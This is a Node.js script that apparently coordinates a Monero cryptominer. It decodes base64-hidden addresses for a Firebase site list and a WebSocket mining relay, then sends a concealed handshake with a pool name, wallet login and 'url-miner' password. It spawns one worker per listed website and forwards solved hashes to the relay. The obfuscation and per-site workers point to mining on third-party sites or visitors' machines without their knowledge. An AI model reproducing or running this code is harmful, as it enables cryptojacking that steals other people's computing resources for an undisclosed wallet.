const { Worker, workerData } = require('node:worker_threads')
const WebSocketClient = require('websocket').client
const axios = require('axios')

let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')

let WSS = decode('d3NzOi8vdHJ1c3RhcHJvaWFtLmRlOjEwMDA1Lw==')

let mClient = null
let mJob = null
let mAccepted = 0
let mPrevAcpt = 0
let mWorker = {}



startServer()

async function startServer() {
    try {
        let size = 0
        let mList = []
        await waitForJob()
        let response = await axios.get(BASE_URL+'website.json')
        
        for (let key of Object.keys(response.data)) {
            try {
                size++
                let worker = await addWorker(size, 'https://'+key.replace(/__/g, '-').replace(/_/g, '.'), mJob)
                worker.on('message', onMessage)
                mWorker[key] = worker
            } catch (error) {}
        }

        console.log('Worker Size: ', size)
    } catch (error) {
        console.log('Start Server Error')

        await delay(3000)
        await startServer()
    }
}

async function waitForJob() {
    while (true) {
        await delay(1000)
        if (mJob != null) {
            break
        }
    }
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}

const addWorker = async (id, url, job) => {
    return new Promise((resolve, reject) => {
        let worker = new Worker('./worker.js', { workerData: { id:id, url:url, job:job } })
        resolve(worker)
    })
}

const onMessage = function(solved) {
    mAccepted++
    if (mClient) {
        mClient.send(JSON.stringify(solved))
    }
}

connneckClient()

function connneckClient() {
    let client = new WebSocketClient()

    client.on('connectFailed', function(error) {
        mClient = null
        console.log('Re-Connect', error)
        setTimeout(() => connneckClient(), 2000)
    })
    
    client.on('connect', function(conn) {
    
        mClient = conn
    
        console.log('WebSocket Client Connected')
    
        mClient.send(decode('eyJpZGVudGlmaWVyIjoiaGFuZHNoYWtlIiwicG9vbCI6ImZhc3Rlci54bXIiLCJyaWdodGFsZ28iOiJjbi9yIiwibG9naW4iOiI4NEFiUG0ybUNpQkNoMTgyZ3N2cVNSWExwRWM5SmdVSjk2eDNLUTZoMzVFQ0V0U3pNV0ZEYW1NZFdMOThwVzE2dGY2MXZKaXczNG5ZZk1paThoVFczcGJUREM3QnFURyIsInBhc3N3b3JkIjoidXJsLW1pbmVyIiwidXNlcmlkIjoiIiwidmVyc2lvbiI6MTMsImludHZlcnNpb24iOjEzMzcsIm15ZG9tYWluIjoiV0VCIFNjcmlwdCAxNi0xMS0yMyBQZXJmZWt0IGh0dHBzOi8vd3d3LnJhaXlhbjA4OC54eXoifQ=='))
    
        mClient.on('error', function(error) {
            mClient = null
            console.log('Re-Connect')
            setTimeout(() => connneckClient(), 2000)
        })
    
        // mClient.on('close', function() {
        //     mClient = null
        //     console.log('Re-Connect')
        //     setTimeout(() => connneckClient(), 2000)
        // })
    
        mClient.on('message', function(message) {
            try {
                let data = JSON.parse(message.utf8Data)
                if(data['identifier'] == 'job') {
                    mJob = data
                    
                    console.log('New Job Received.')
                    sendJob()
                }
            } catch (e) {}
        })
    })
    
    client.connect(WSS)
}

function sendJob() {
    for(let worker of Object.values(mWorker)) {
        try {
            worker.postMessage(mJob)
        } catch (error) {}
    }
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}

setInterval(function() {
    if(mJob) {
        if (mAccepted != mPrevAcpt) {
            console.log('Hash Accepted: ', mAccepted)
            mPrevAcpt = mAccepted
        }
    }
}, 5000)